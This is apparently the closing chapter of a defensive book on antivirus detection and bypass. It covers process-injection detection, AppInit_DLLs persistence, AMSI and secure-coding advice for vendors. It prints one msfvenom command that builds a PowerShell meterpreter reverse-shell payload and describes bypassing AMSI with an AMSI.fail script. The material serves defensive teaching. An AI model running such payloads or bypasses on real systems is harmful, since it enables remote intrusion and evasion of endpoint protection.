### Best Practices and Recommendations

#### Event-Based Detection
Event ID 8 can be utilized to detect process injection by flagging instances where a process creates a thread in another process. However, further research is necessary to develop a more comprehensive detection strategy based on logs.

#### Registry-Based Detection
Malware often injects its code (such as shellcode, executables, or DLLs) and persists in the system. A common method for persistence is through the manipulation of registry keys. For example:
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\Appinit_Dlls`
- `HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\Appinit_Dlls`

These registry keys can serve both as persistence mechanisms and injection vectors. Malware can achieve persistency by adding a malicious DLL, which is then loaded into any process that loads the standard `User32.dll`. This provides significant power and impact for both injection and persistence.

We recommend that antivirus vendors enhance their detection engines to identify malware that manipulates registry keys using functions like `RegCreateKey` and `RegSetValue`.

#### Behavior-Based Detection
Behavior-based detection is valuable for identifying anomalous or suspicious activities. Examples include:
- Processes like `Notepad.exe` or `Explorer.exe` executing unusual command-line arguments or initiating network connections.
- Processes such as `svchost.exe` or `rundll32.exe` running without command-line arguments.
- Unexpected processes like `PowerShell.exe`, `cmd.exe`, `cscript.exe`, or `wmic.exe`.

#### File-Based Detection
Antivirus vendors can implement a minifilter driver for file-based detection. We recommend scanning files before execution, at load time, to detect suspicious indicators and alteration operations. For instance, an antivirus engine can detect the creation of sections in targeted files.

To summarize, detecting process injection is challenging, especially for antivirus vendors. It is essential to use multiple detection capabilities and correlate their results to achieve the best possible detection with minimal false positives.

### Script-Based Malware Detection with AMSI

#### Introduction to AMSI
AMSI (Antimalware Scan Interface) is a feature that provides additional antimalware capabilities. Antivirus engines can use this interface to scan potentially malicious script files and fileless malware scripts that run at the runtime memory level.

AMSI is integrated into various Windows components, including:
- Windows User Account Control (UAC)
- PowerShell
- `wscript.exe` and `cscript.exe`
- JavaScript and VBScript
- Office VBA macros

#### AMSI Internals
Several functions are exposed for use by third-party applications. For example, antivirus engines can call `AmsiScanBuffer()` and `AmsiScanString()` to scan for malicious content in each file and fileless script-based malware before execution. If AMSI detects a malicious script, it will halt execution.

#### Example of AMSI Malware Detection
To demonstrate AMSI's capability, we used a simple, non-obfuscated meterpreter shell generated in a PowerShell format with the following `msfvenom` command:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 --arch x64 --platform win -f psh -o msf_payload.ps1
```
After executing the script, Windows Defender and AMSI detected our simple PowerShell payload. The event log entries for this detection include:
- Event ID 1116: `MALWAREPROTECTION_STATE_MALWARE_DETECTED`
- Event ID 1117: `MALWAREPROTECTION_STATE_MALWARE_ACTION_TAKEN`

#### Bypassing AMSI
To bypass AMSI, we used a PowerShell script from the `AMSI.fail` project. By copying and pasting the generated code into the PowerShell console, we demonstrated an in-memory-like execution. This allowed us to execute a reverse-shell payload and gain a full meterpreter shell.

We recommend that antivirus vendors invest in implementing and enhancing these capabilities, as relying solely on AMSI is not sufficient. Malware-based attacks are continually evolving, particularly those delivered through scripts, such as PowerShell, VBA macros, and VBScript.

### Secure Coding Recommendations

#### Importance of Secure Coding
Writing secure code is crucial for antivirus software, as it provides security to endpoints. To improve overall security, we recommend the following:

1. **Self-Protection Mechanism**: Ensure your antivirus software has a self-protection mechanism to prevent exploitation by security researchers or threat actors.
2. **Secure Code Planning**: Plan your code with an emphasis on secure coding practices to minimize the need for future updates and patches.
3. **Regular Code Updates**: Regularly update and delete old code to reduce the risk of vulnerabilities.
4. **Input Validation**: Apply input validation at all points where user or third-party input is expected to prevent malicious input.
5. **Principle of Least Privilege (PoLP)**: Manage privileges to prevent misuse or exploitation by users or third parties.
6. **Compiler Warnings**: Configure the highest level of compiler warnings to catch potentially vulnerable functions.
7. **Automated Code Testing**: Implement automated testing for static and dynamic code analysis.
8. **Wait Mechanisms**: Use wait mechanisms to prevent race conditions.
9. **Integrity Validation**: Apply integrity validation mechanisms when downloading static signature files to prevent tampering.

### Summary
Antivirus bypasses remain relevant due to insecure code and improperly functioning components. To protect antivirus engines, it is necessary to test and fix vulnerabilities regularly. These recommendations are based on extensive research and real-world vulnerabilities disclosed over the past decade.

Thank you for reading this book. We hope the knowledge gained will contribute to making the world a more secure place. Remember, antivirus solutions are not 100% bulletproof, but they are a critical component of a comprehensive security strategy.
